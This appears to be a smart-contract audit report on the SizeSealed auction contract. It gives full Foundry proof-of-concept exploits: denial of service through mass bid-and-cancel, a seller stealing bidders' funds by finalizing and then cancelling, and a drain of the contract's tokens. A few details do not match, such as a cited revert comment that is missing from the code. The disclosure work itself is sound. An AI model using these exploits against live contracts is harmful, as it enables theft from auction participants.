### [H-01] A malicious bidder can DOS the auction by making 1000 bids and then cancelling all of them.

### Impact

A malicious bidder can do two things:

- DOS the entire auction so no one can place a bid.
- Create `1000` bids with minimum amount and cancel `999` so they get to buy minimum number of base tokens for minimum price and others can’t place any bid.

### POC

After an auction starts if a malicious user wants to buy the minimum number of basetoken for the minimum number of quote tokens they can create `1000` bids with the minimum baseamount and minimumquote, and then cancel `999` of those bids so other buyers can’t place their bids.

Below is the code:

`./SizeSealed.t.sol`

```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.17;

import {Test} from "forge-std/Test.sol";
import {Merkle} from "murky/Merkle.sol";
import {FixedPointMathLib} from "solmate/utils/FixedPointMathLib.sol";

import {ECCMath} from "../util/ECCMath.sol";
import {SizeSealed} from "../SizeSealed.sol";
import {MockBuyer} from "./mocks/MockBuyer.sol";
import {MockERC20} from "./mocks/MockERC20.sol";
import {MockSeller} from "./mocks/MockSeller.sol";
import {ISizeSealed} from "../interfaces/ISizeSealed.sol";

contract SizeSealedTest is Test, ISizeSealed {

    SizeSealed auction;

    MockSeller seller1;
    MockSeller seller2;
    MockERC20 quoteToken1;
    MockERC20 quoteToken2;
    MockERC20 baseToken;

    MockBuyer bidder1;
    MockBuyer bidder2;
    MockBuyer bidder3;

    // Auction parameters (cliff unlock)
    uint32 startTime;
    uint32 endTime;
    uint32 unlockTime;
    uint32 unlockEnd;
    uint128 cliffPercent;

    uint128 baseToSell;

    uint256 reserveQuotePerBase1 = 1500e18 * uint256(type(uint128).max) / 1e18;
    uint128 minimumBidQuote1 = 1500e18;

    uint256 reserveQuotePerBase2 = 1e18 * uint256(type(uint128).max) / 1e18;
    uint128 minimumBidQuote2 = 1e18;

    function setUp() public {
        // Create quote and bid tokens
        quoteToken1 = new MockERC20("Dai Stablecoin", "DAI", 18);
        quoteToken2 = new MockERC20("Similar to ether", "SETH", 18);

        baseToken = new MockERC20("Wrapped Ether", "WETH", 18);

        // Init auction contract
        auction = new SizeSealed();

        // Create seller
        seller1 = new MockSeller(address(auction), quoteToken1, baseToken);
        // seller2 = new MockSeller(address(auction), quoteToken2, baseToken);

        // Create bidders
        bidder1 = new MockBuyer(address(auction), quoteToken1, baseToken);
        bidder2 = new MockBuyer(address(auction), quoteToken1, baseToken);
        // bidder3 = new MockBuyer(address(auction), quoteToken2, baseToken);

        startTime = uint32(block.timestamp);
        endTime = uint32(block.timestamp) + 60;
        unlockTime = uint32(block.timestamp) + 100;
        unlockEnd = uint32(block.timestamp) + 1000;
        cliffPercent = 0;

        baseToSell = 10000 ether;
        vm.label(address(bidder1), "Bidder 1");
        vm.label(address(bidder2), "Bidder 2");
        vm.label(address(quoteToken1), "Quote Token1");
        vm.label(address(quoteToken2), "Quote Token2");
        vm.label(address(baseToken), "Base Token");
    }

    function testAuctionDOS() public {
        
        (uint256 sellerBeforeQuote, uint256 sellerBeforeBase) = seller1.balances();
        uint256 aid = seller1.createAuction(
            baseToSell, reserveQuotePerBase1, minimumBidQuote1, startTime, endTime, unlockTime, unlockEnd, cliffPercent
        );
        bidder1.setAuctionId(aid);
        bidder2.setAuctionId(aid);

        for(uint256 i = 0;i < 1000;i++){
            bidder1.bidOnAuctionWithSalt(1 ether, 1501 ether, "hello"); // first
        }

        // first
        (uint256 buyerAfterQuote1,  uint256 buyerbase1) = bidder1.balances();
        emit log_named_decimal_uint("balance quote before cancel", buyerAfterQuote1,18);
        emit log_named_decimal_uint("balance base before cancel", buyerbase1,18);
        for(uint256 i=999;i > 0;i--){
            bidder1.cancel(i);
        }
        // bidder2.bidOnAuctionWithSalt(10000 ether, 16000000 ether, "hello");
        // second
        (uint256 buyerAfterQuote2,  uint256 buyerbase2) = bidder1.balances();
        emit log_named_decimal_uint("balance quote after cancel", buyerAfterQuote2,18);
        emit log_named_decimal_uint("balance base after cancel", buyerbase2,18);
        
        uint256[] memory bidIndices = new uint[](1000);
        for(uint256 i = 0;i < 1000;i++){
            bidIndices[i] = i;
        }
        vm.warp(endTime + 1);
        seller1.finalize(bidIndices, 1 ether ,1501 ether);
        (uint256 sellerAfterQuote, uint256 sellerAfterBase) = seller1.balances(); // 1501000 , 9000
        
        //third
        vm.warp(unlockEnd + 1);
        bidder1.withdrawindex(0);
        (uint256 buyerAfterQuote3,  uint256 buyerbase3) = bidder1.balances();
        emit log_named_decimal_uint("balance quote after finalize", buyerAfterQuote3,18);
        emit log_named_decimal_uint("balance base after finalize", buyerbase3,18);
    }
}
```

`./MockBuyer.sol`

```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.17;

import {DSTest} from "ds-test/test.sol";

import {MockERC20} from "./MockERC20.sol";
import {ECCMath} from "../../util/ECCMath.sol";
import {SizeSealed} from "../../SizeSealed.sol";
import {ISizeSealed} from "../../interfaces/ISizeSealed.sol";

contract MockBuyer is ISizeSealed, DSTest {

    SizeSealed auctionContract;

    uint256 auctionId;
    uint256 lastBidIndex;
    uint128 baseAmount;
    bytes16 salt;

    ECCMath.Point publicKey;

    MockERC20 quoteToken;
    MockERC20 baseToken;

    uint256 constant SELLER_PRIVATE_KEY = uint256(keccak256("Size Seller"));
    uint256 constant BUYER_PRIVATE_KEY = uint256(keccak256("Size Buyer"));

    constructor(address _auction_contract, MockERC20 _quoteToken, MockERC20 _baseToken) {
        auctionContract = SizeSealed(_auction_contract);

        quoteToken = _quoteToken;
        baseToken = _baseToken;
        publicKey = ECCMath.publicKey(BUYER_PRIVATE_KEY);
        salt = bytes16(keccak256(abi.encode("randomsalt")));
        // Mint quote tokens (USDC to ourselves)
        mintQuote(16000000 ether);
    }

    function setAuctionId(uint256 _aid) external {
        auctionId = _aid;
    }

    function bidOnAuction(uint128 _baseAmount, uint128 quoteAmount) public returns (uint256) {
        require(quoteToken.balanceOf(address(this)) >= quoteAmount);
        baseAmount = _baseAmount;
        bytes32 message = auctionContract.computeMessage(baseAmount, salt);
        (, bytes32 encryptedMessage) =
            ECCMath.encryptMessage(ECCMath.publicKey(SELLER_PRIVATE_KEY), BUYER_PRIVATE_KEY, message);

        lastBidIndex = auctionContract.bid(
            auctionId,
            quoteAmount,
            auctionContract.computeCommitment(message),
            publicKey,
            encryptedMessage,
            "",
            new bytes32[](0)
        );
        return lastBidIndex;
    }

    function bidOnWhitelistAuctionWithSalt(
        uint128 _baseAmount,
        uint128 quoteAmount,
        bytes16 _salt,
        bytes32[] calldata proof
    ) public returns (uint256) {
        baseAmount = _baseAmount;
        salt = _salt;
        bytes32 message = auctionContract.computeMessage(baseAmount, _salt);
        (, bytes32 encryptedMessage) =
            ECCMath.encryptMessage(ECCMath.publicKey(SELLER_PRIVATE_KEY), BUYER_PRIVATE_KEY, message);

        lastBidIndex = auctionContract.bid(
            auctionId, quoteAmount, auctionContract.computeCommitment(message), publicKey, encryptedMessage, "", proof
        );
        return lastBidIndex;
    }

    function bidOnAuctionWithSalt(uint128 _baseAmount, uint128 quoteAmount, bytes16 _salt) public returns (uint256) {
        require(quoteToken.balanceOf(address(this)) >= quoteAmount);
        baseAmount = _baseAmount;
        salt = _salt;
        bytes32 message = auctionContract.computeMessage(baseAmount, _salt);
        (, bytes32 encryptedMessage) =
            ECCMath.encryptMessage(ECCMath.publicKey(SELLER_PRIVATE_KEY), BUYER_PRIVATE_KEY, message);

        lastBidIndex = auctionContract.bid(
            auctionId,
            quoteAmount,
            auctionContract.computeCommitment(message),
            publicKey,
            encryptedMessage,
            "",
            new bytes32[](0)
        );
        return lastBidIndex;
    }

    function balances() public view returns (uint256, uint256) {
        return (quoteToken.balanceOf(address(this)), baseToken.balanceOf(address(this)));
    }

    // withdraw the last bid we just made
    function withdraw() public {
        SizeSealed(auctionContract).withdraw(auctionId, lastBidIndex);
    }

    function withdrawindex(uint256 index) public {
        SizeSealed(auctionContract).withdraw(auctionId, index);
    }

    function refund() public {
        SizeSealed(auctionContract).refund(auctionId, lastBidIndex);
    }

    function cancel(uint256 bidatindex) public {
        SizeSealed(auctionContract).cancelBid(auctionId, bidatindex);
    }

    function mintQuote(uint256 amount) public {
        quoteToken.mint(address(this), amount);
        quoteToken.approve(address(auctionContract), type(uint256).max);
    }
}
```

`./MockSeller.sol`

```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.17;

import {DSTest} from "ds-test/test.sol";

import {MockERC20} from "./MockERC20.sol";
import {ECCMath} from "../../util/ECCMath.sol";
import {SizeSealed} from "../../SizeSealed.sol";
import {ISizeSealed} from "../../interfaces/ISizeSealed.sol";

contract MockSeller is ISizeSealed, DSTest {
    SizeSealed auctionContract;

    uint256 auctionId;
    ECCMath.Point publicKey;

    MockERC20 quoteToken;
    MockERC20 baseToken;

    uint256 constant SELLER_PRIVATE_KEY = uint256(keccak256("Size Seller"));
    uint256 constant SELLER_STARTING_BASE = 10000 ether;

    constructor(address _auction_contract, MockERC20 _quoteToken, MockERC20 _baseToken) {
        auctionContract = SizeSealed(_auction_contract);
        quoteToken = _quoteToken;
        baseToken = _baseToken;
        publicKey = ECCMath.publicKey(SELLER_PRIVATE_KEY);
        mintBase(SELLER_STARTING_BASE);
    }

    function createAuction(
        uint128 totalBaseTokens,
        uint256 reserveQuotePerBase,
        uint128 minimumBidQuote,
        uint32 startTimestamp,
        uint32 endTimestamp,
        uint32 unlockStartTimestamp,
        uint32 unlockEndTimestamp,
        uint128 cliffPercent
    ) public returns (uint256) {
        ISizeSealed.Timings memory timings = ISizeSealed.Timings(
            uint32(startTimestamp),
            uint32(endTimestamp),
            uint32(unlockStartTimestamp),
            uint32(unlockEndTimestamp),
            uint128(cliffPercent)
        );

        ISizeSealed.AuctionParameters memory params = ISizeSealed.AuctionParameters(
            address(baseToken),
            address(quoteToken),
            reserveQuotePerBase,
            totalBaseTokens,
            minimumBidQuote,
            bytes32(0),
            publicKey
        );

        auctionId = auctionContract.createAuction(params, timings, "");
        return auctionId;
    }

    function createAuctionWhitelist(
        uint128 totalBaseTokens,
        uint256 reserveQuotePerBase,
        uint128 minimumBidQuote,
        uint32 startTimestamp,
        uint32 endTimestamp,
        uint32 unlockStartTimestamp,
        uint32 unlockEndTimestamp,
        uint128 cliffPercent,
        bytes32 merkleRoot
    ) public returns (uint256) {
        ISizeSealed.Timings memory timings = ISizeSealed.Timings(
            uint32(startTimestamp),
            uint32(endTimestamp),
            uint32(unlockStartTimestamp),
            uint32(unlockEndTimestamp),
            uint128(cliffPercent)
        );

        ISizeSealed.AuctionParameters memory params = ISizeSealed.AuctionParameters(
            address(baseToken),
            address(quoteToken),
            reserveQuotePerBase,
            totalBaseTokens,
            minimumBidQuote,
            merkleRoot,
            publicKey
        );

        auctionId = auctionContract.createAuction(params, timings, "");
        return auctionId;
    }

    function finalize(uint256[] calldata bidIndices, uint128 clearingBase, uint128 clearingQuote) public {
        auctionContract.reveal(auctionId, SELLER_PRIVATE_KEY, abi.encode(bidIndices, clearingBase, clearingQuote));
        // auctionContract.finalize(auctionId, bidIndices, clearingBase, clearingQuote);
    }

    function cancelAuction() public {
        auctionContract.cancelAuction(auctionId);
    }

    function balances() public view returns (uint256, uint256) {
        return (quoteToken.balanceOf(address(this)), baseToken.balanceOf(address(this)));
    }

    function mintBase(uint256 amount) public {
        baseToken.mint(address(this), amount);
        baseToken.approve(address(auctionContract), type(uint256).max);
    }
}
```

- Note: The transaction would revert on the line with the comment `// [WOULD REVERT]`, showing that other bidders can’t place bets.
- If the line is removed it can be seen that the final balance of bidder1 would include

Output:

```solidity
Logs:
  balance quote before cancel: 14499000.000000000000000000
  balance base before cancel: 0.000000000000000000
  balance quote after cancel: 15998499.000000000000000000
  balance base after cancel: 0.000000000000000000
  balance quote after finalize: 15998499.000000000000000000
  balance base after finalize: 1.000000000000000000
```

## [M-01] Inconsistent quoteAmount balances for bidders in case of Transfer-On-Fee or Deflationary Tokens.

A transfer-on-fee token or a deflationary/rebasing token, causing the received amount to be less than the accounted amount. For instance, a deflationary tokens might charge a certain fee for every transfer() or transferFrom().

In case such a token is used for quoteToken the internal account would be wrongly calculated as the actual value of `quoteAmount` in case of `Bid` function would be different from the amount of tokens that are transfered to the contract.

This would cause issues when bidders call `withdraw` , `refund` or `cancelBid`.

This case is perfectly handled for baseTokens when creating an auction (before & after balance checks) : 

```solidity
./SizeSealed.sol

96:		  uint256 balanceBeforeTransfer = ERC20(auctionParams.baseToken).balanceOf(address(this));

        SafeTransferLib.safeTransferFrom(
            ERC20(auctionParams.baseToken), msg.sender, address(this), auctionParams.totalBaseAmount
        );

        uint256 balanceAfterTransfer = ERC20(auctionParams.baseToken).balanceOf(address(this));
        if (balanceAfterTransfer - balanceBeforeTransfer != auctionParams.totalBaseAmount) {
            revert UnexpectedBalanceChange();
        }
```

But the case is not handled for quotetokens.

### Recommentations

Recommend transferring the tokens first and comparing pre-/after token balances to compute the actual deposited amount.

## [H-01] Malicious seller can steal from bidders.

### Impact

A seller can `cancel` the auction after `finalize` and thus can steal money from the bidders and get their original `baseToken` back.

### POC

When an auction is started the value of `a.data.lowestQuote` is set as `type(uint128).max` here [https://github.com/code-423n4/2022-11-size/blob/main/src/SizeSealed.sol#L90](https://github.com/code-423n4/2022-11-size/blob/main/src/SizeSealed.sol#L90) . 

In the `atState` function this value (`a.data.lowestQuote`) is checked to see if the state is `States.Finalized` or not. ([https://github.com/code-423n4/2022-11-size/blob/main/src/SizeSealed.sol#L33](https://github.com/code-423n4/2022-11-size/blob/main/src/SizeSealed.sol#L33))

If we somehow manage to put the value of `a.data.lowestQuote` as `type(uint128).max` after/during the finalization phase, the contract would assume that the auction is still not finalized , and thus the seller would be able to cancel the auction.

There is one more place where `a.data.lowestQuote` can be modified and it is this line : [https://github.com/code-423n4/2022-11-size/blob/main/src/SizeSealed.sol#L238](https://github.com/code-423n4/2022-11-size/blob/main/src/SizeSealed.sol#L238) . 

Even if we set the value of `a.data.lowestQuote` to `type(uint128).max` in the finalize we would also need to pass this check [https://github.com/code-423n4/2022-11-size/blob/main/src/SizeSealed.sol#L297](https://github.com/code-423n4/2022-11-size/blob/main/src/SizeSealed.sol#L297) . But this check only checks if the value of  `FixedPointMathLib.mulDivDown(clearingQuote, type(uint128).max, clearingBase))` is equal to `data.previousQuotePerBase` which can be bypassed if the seller places a fake so that the following condition is bypassed:

$clearingQuote/clearingBase == b.quoteAmount/baseAmount$

An easy way to do this is to keep the values of `clearingQuote == clearingBase == type(uint128).max` and `b.quoteAmount == baseAmount == 1`.

Now let’s assume a scenario where a malicious seller sets up an auction with the following parameters:

```solidity
uint256 reserveQuotePerBase = 1e18 * uint256(type(uint128).max) / 1e18;
uint128 minimumBidQuote = 1;
quoteToken = new MockERC20("Dai Stablecoin", "DAI", 18);
baseToken = new MockERC20("Wrapped Ether", "WETH", 18);
baseToSell = 10000 ether;
```

> Here I’ve kept the value of `reserveQuotePerBase` to be 1 quote per base to keep the maths easier.
> 

Now let’s say there are a few bidders who place their bids. 

```solidity
bidder.bidOnAuctionWithSalt(1 ether, 1500 ether, "hello"); // want to buy 1 WETH for 1500 DAI
bidder1.bidOnAuctionWithSalt(1000 ether, 1500000 ether, "hello"); // want to buy 1000 WETH for 1500000 DAI
```

Now the seller can place a fake bid using another account/contract like this :

```solidity
seller_as_fake_bidder.bidOnAuctionWithSalt(1 ether, 1 ether, "hello");
```

> The seller can also place 977 fake bids and cancel 976 so no other bid can be place after theirs.
> 

Now if the seller calls finalize with the following parameter:

```solidity
uint256[] memory bidIndices = new uint[](3);
bidIndices[0] = 0;
bidIndices[1] = 1;
bidIndices[2] = 2;
seller.finalize(bidIndices, type(uint128).max ,type(uint128).max);
```

They would be able to bypass the finalize function, get the `quoteAmount` from bidders to their `seller` contract and would set `a.data.lowestQuote` to `type(uint128).max` . This would then allow them to call `cancelAuction` and thus get back their `baseTokens`.

Full POC here:

```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.17;

import {Test} from "forge-std/Test.sol";
import {Merkle} from "murky/Merkle.sol";
import {FixedPointMathLib} from "solmate/utils/FixedPointMathLib.sol";

import {ECCMath} from "../util/ECCMath.sol";
import {SizeSealed} from "../SizeSealed.sol";
import {MockBuyer} from "./mocks/MockBuyer.sol";
import {MockERC20} from "./mocks/MockERC20.sol";
import {MockSeller} from "./mocks/MockSeller.sol";
import {ISizeSealed} from "../interfaces/ISizeSealed.sol";

contract SizeSealedTest is Test, ISizeSealed {

    SizeSealed auction;

    MockSeller seller;
    MockSeller seller2;
    MockERC20 quoteToken;
    MockERC20 quoteToken2;
    MockERC20 baseToken;

    MockBuyer bidder;
    MockBuyer bidder1;
    MockBuyer seller_as_fake_bidder;

    // Auction parameters (cliff unlock)
    uint32 startTime;
    uint32 endTime;
    uint32 unlockTime;
    uint32 unlockEnd;
    uint128 cliffPercent;

    uint128 baseToSell;

    uint256 reserveQuotePerBase = 1e18 * uint256(type(uint128).max) / 1e18;
    uint128 minimumBidQuote = 1;

    function setUp() public {
        // Create quote and bid tokens
        quoteToken = new MockERC20("Dai Stablecoin", "DAI", 18);

        baseToken = new MockERC20("Wrapped Ether", "WETH", 18);

        // Init auction contract
        auction = new SizeSealed();

        // Create seller
        seller = new MockSeller(address(auction), quoteToken, baseToken);

        // Create bidders
        bidder = new MockBuyer(address(auction), quoteToken, baseToken);
        bidder1 = new MockBuyer(address(auction), quoteToken, baseToken);
        seller_as_fake_bidder = new MockBuyer(address(auction), quoteToken, baseToken);

        startTime = uint32(block.timestamp);
        endTime = uint32(block.timestamp) + 60;
        unlockTime = uint32(block.timestamp) + 100;
        unlockEnd = uint32(block.timestamp) + 1000;
        cliffPercent = 0;

        baseToSell = 10000 ether;
        vm.label(address(bidder), "Bidder 1");
        
        vm.label(address(quoteToken), "Quote Token1");
        vm.label(address(baseToken), "Base Token");
    }

    function testStealBids() public {
        (uint256 beforeFinalizeQuote, uint256 beforeFinalizeBase) = seller.balances();
        uint256 aid = seller.createAuction(
            baseToSell, reserveQuotePerBase, minimumBidQuote, startTime, endTime, unlockTime, unlockEnd, cliffPercent
        );
        bidder.setAuctionId(aid);
        bidder1.setAuctionId(aid);
        seller_as_fake_bidder.setAuctionId(aid);

        bidder.bidOnAuctionWithSalt(1 ether, 1500 ether, "hello"); // want to buy 1 WETH for 1500 DAI
        bidder1.bidOnAuctionWithSalt(1000 ether, 1500000 ether, "hello"); // want to buy 1000 WETH for 1500000 DAI
        seller_as_fake_bidder.bidOnAuctionWithSalt(1 ether, 1 ether, "hello");

        vm.warp(endTime + 1);
        uint256[] memory bidIndices = new uint[](3);
        bidIndices[0] = 0;
        bidIndices[1] = 1;
        bidIndices[2] = 2;
        seller.finalize(bidIndices, type(uint128).max ,type(uint128).max);
        seller.cancelAuction(); 
        (uint256 afterFinalizeQuote, uint256 afterFinalizeBase) = seller.balances();
        emit log_named_decimal_uint("Before Finalize Quote ",beforeFinalizeQuote,18);
        emit log_named_decimal_uint("Before Finalize Base ",beforeFinalizeBase,18);
        emit log_named_decimal_uint("After Finalize Quote ",afterFinalizeQuote,18);
        emit log_named_decimal_uint("After Finalize Base ",afterFinalizeBase,18);
    }
}
```

It should output the following :

```solidity
Running 1 test for src/test/SizeSealed.t.sol:SizeSealedTest
[PASS] testStealBids() (gas: 1148973)
Logs:
  Before Finalize Quote : 0.000000000000000000
  Before Finalize Base : 10000.000000000000000000
  After Finalize Quote : 1002.000000000000000000
  After Finalize Base : 10000.000000000000000000
```

The seller now has both the bids and the initial basetokens they placed for their bid.

Now if the bidders try to call `refund` or `withdraw` , the transaction would revert with `InvalidState` .

### Recommendations:

`a.data.lowestQuote` should be checked with the actual lowestquote instead of just the division check.

## [H-02] Attacker can drain the SizeSealed.sol contract.

### Impact

An attacker can drain the `SizeSealed.sol` contract buy creating fake auction and manipulating some contract logic.

### POC

Assuming that the `SizeSealed.sol` initially contains 10000 DAI tokens, I’ll demonstrate how an attacker can steal these tokens.

The bug is similar to what I previous reported but there is one more instance of similar wrong check, its here [https://github.com/code-423n4/2022-11-size/blob/main/src/SizeSealed.sol#L426](https://github.com/code-423n4/2022-11-size/blob/main/src/SizeSealed.sol#L426)

```solidity
if (block.timestamp >= a.timings.endTimestamp) {
            if (a.data.lowestQuote != type(uint128).max || block.timestamp <= a.timings.endTimestamp + 24 hours) {
                revert InvalidState();
            }
        }
```

A seller can manipulate the contract the similar was as I showed in the previous contract, (here is a quick recap of the exploit):

1. Create an auction with the following parameters:

```solidity
uint256 reserveQuotePerBase = 1e18 * uint256(type(uint128).max) / 1e18;
uint128 minimumBidQuote = 1;
quoteToken = new MockERC20("Dai Stablecoin", "DAI", 18);
baseToken = new MockERC20("Wrapped Ether", "WETH", 18);
baseToSell = 10000 ether;
```

1. Now the seller would create a fake bet like the following:

```solidity
seller_as_fake_bidder.bidOnAuctionWithSalt(baseToSell, baseToSell, "hello"); // want to buy
```

1. Seller would finalize and cancel the auction:

```solidity
uint256[] memory bidIndices = new uint[](1);
bidIndices[0] = 0;
seller.finalize(bidIndices, type(uint128).max ,type(uint128).max);
seller.cancelAuction();
```

1. Seller would then cancel their bet from their fake bidder contract:

```solidity
seller_as_fake_bidder.cancel(0); // cancel the bid
```

The call to cancel would be successful as the above check which I mentioned would be bypassed because `a.data.lowestQuote`  would be equal to `type(uint128).max`

The cancel Bid function would return the quoteAmount back to the fake bidder.

Full POC:

```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.17;

import {Test} from "forge-std/Test.sol";
import {Merkle} from "murky/Merkle.sol";
import {FixedPointMathLib} from "solmate/utils/FixedPointMathLib.sol";

import {ECCMath} from "../util/ECCMath.sol";
import {SizeSealed} from "../SizeSealed.sol";
import {MockBuyer} from "./mocks/MockBuyer.sol";
import {MockERC20} from "./mocks/MockERC20.sol";
import {MockSeller} from "./mocks/MockSeller.sol";
import {ISizeSealed} from "../interfaces/ISizeSealed.sol";

contract SizeSealedTest is Test, ISizeSealed {

    SizeSealed auction;

    MockSeller seller;
    MockSeller seller2;
    MockERC20 quoteToken;
    MockERC20 quoteToken2;
    MockERC20 baseToken;

    MockBuyer bidder;
    MockBuyer bidder1;
    MockBuyer seller_as_fake_bidder;

    // Auction parameters (cliff unlock)
    uint32 startTime;
    uint32 endTime;
    uint32 unlockTime;
    uint32 unlockEnd;
    uint128 cliffPercent;

    uint128 baseToSell;

    uint256 reserveQuotePerBase = 1e18 * uint256(type(uint128).max) / 1e18;
    uint128 minimumBidQuote = 1;

    function setUp() public {
        // Create quote and bid tokens
        quoteToken = new MockERC20("Dai Stablecoin", "DAI", 18);

        baseToken = new MockERC20("Wrapped Ether", "WETH", 18);

        // Init auction contract
        auction = new SizeSealed();

        // Create seller
        seller = new MockSeller(address(auction), quoteToken, baseToken);

        // Create bidders
        bidder = new MockBuyer(address(auction), quoteToken, baseToken);
        bidder1 = new MockBuyer(address(auction), quoteToken, baseToken);
        seller_as_fake_bidder = new MockBuyer(address(auction), quoteToken, baseToken);

        startTime = uint32(block.timestamp);
        endTime = uint32(block.timestamp) + 60;
        unlockTime = uint32(block.timestamp) + 100;
        unlockEnd = uint32(block.timestamp) + 1000;
        cliffPercent = 0;

        baseToSell = 10000 ether;
        vm.label(address(bidder), "Bidder 1");
        
        vm.label(address(quoteToken), "Quote Token1");
        vm.label(address(baseToken), "Base Token");
    }

    function testStealfromSize() public {
        quoteToken.mint(address(auction), 10000 ether); // mint 10000 DAI to auction, to demonstrate that the auction initially containts DAI.
        (uint256 beforeFinalizeQuote, uint256 beforeFinalizeBase) = seller.balances();
        (uint256 beforeFinalizefakebidderQuote, uint256 beforeFinalizefakebidderBase) = seller_as_fake_bidder.balances();
        uint256 beforeauctionQuote = quoteToken.balanceOf(address(auction));
        uint256 beforeauctionBase = baseToken.balanceOf(address(auction));
        uint256 aid = seller.createAuction(
            baseToSell, reserveQuotePerBase, minimumBidQuote, startTime, endTime, unlockTime, unlockEnd, cliffPercent
        );
        seller_as_fake_bidder.setAuctionId(aid);
        seller_as_fake_bidder.bidOnAuctionWithSalt(baseToSell, baseToSell, "hello"); // want to buy 
        vm.warp(endTime + 1);
        uint256[] memory bidIndices = new uint[](1);
        bidIndices[0] = 0;
        seller.finalize(bidIndices, type(uint128).max ,type(uint128).max);
        seller.cancelAuction(); 
        (uint256 afterFinalizeQuote, uint256 afterFinalizeBase) = seller.balances();
        seller_as_fake_bidder.cancel(0);
        (uint256 afterFinalizefakebidderQuote, uint256 afterFinalizefakebidderBase) = seller_as_fake_bidder.balances();
        uint256 afterauctionQuote = quoteToken.balanceOf(address(auction));
        uint256 afterauctionBase = baseToken.balanceOf(address(auction));
        emit log_named_decimal_uint("Before Finalize Quote of seller : ",beforeFinalizeQuote,18);
        emit log_named_decimal_uint("Before Finalize Base of seller : ",beforeFinalizeBase,18);
        emit log_named_decimal_uint("Before Finalize Quote of seller as fake bidder : ",beforeFinalizefakebidderQuote,18);
        emit log_named_decimal_uint("Before Finalize Base of seller as fake bidder : ",beforeFinalizefakebidderBase,18);
        emit log_named_decimal_uint("Before Finalize Quote of auction : ",beforeauctionQuote,18);
        emit log_named_decimal_uint("Before Finalize Base of auction : ",beforeauctionBase,18);
        emit log_named_decimal_uint("After Finalize Quote of seller : ",afterFinalizeQuote,18);
        emit log_named_decimal_uint("After Finalize Base of seller : ",afterFinalizeBase,18);
        emit log_named_decimal_uint("After Finalize Quote of seller as fake bidder : ",afterFinalizefakebidderQuote,18);
        emit log_named_decimal_uint("After Finalize Base of seller as fake bidder : ",afterFinalizefakebidderBase,18);
        emit log_named_decimal_uint("After Finalize Quote of auction : ",afterauctionQuote,18);
        emit log_named_decimal_uint("After Finalize Base of auction : ",afterauctionBase,18);
    }
}
```

The output would be the following:

```solidity
Running 1 test for src/test/SizeSealed.t.sol:SizeSealedTest
[PASS] testStealfromSize() (gas: 640827)
Logs:
  Before Finalize Quote of seller : : 0.000000000000000000
  Before Finalize Base of seller : : 10000.000000000000000000
  Before Finalize Quote of seller as fake bidder : : 1500000.000000000000000000
  Before Finalize Base of seller as fake bidder : : 0.000000000000000000
  Before Finalize Quote of auction : : 10000.000000000000000000
  Before Finalize Base of auction : : 0.000000000000000000
  After Finalize Quote of seller : : 10000.000000000000000000
  After Finalize Base of seller : : 10000.000000000000000000
  After Finalize Quote of seller as fake bidder : : 1500000.000000000000000000
  After Finalize Base of seller as fake bidder : : 0.000000000000000000
  After Finalize Quote of auction : : 0.000000000000000000
  After Finalize Base of auction : : 0.000000000000000000
```

It is clear that the auction’s quote token are drained from auction to seller and the fake bidder gets to keep their token.

> I’ve used WETH as baseToken here, but any other token can be used which has low value as compared to quoteToken, so the exploit would not actually need the same amount of WETH tokens, similar amount of any low value ERC20 token should also work.
> 

### Recommended Mitigation Steps:

 [https://github.com/code-423n4/2022-11-size/blob/main/src/SizeSealed.sol#L426](https://github.com/code-423n4/2022-11-size/blob/main/src/SizeSealed.sol#L426) This check is not enough to let user cancel their bid, also the previous bug [https://github.com/code-423n4/2022-11-size/blob/main/src/SizeSealed.sol#L238](https://github.com/code-423n4/2022-11-size/blob/main/src/SizeSealed.sol#L238) is also responsible for the unexpected behaviour.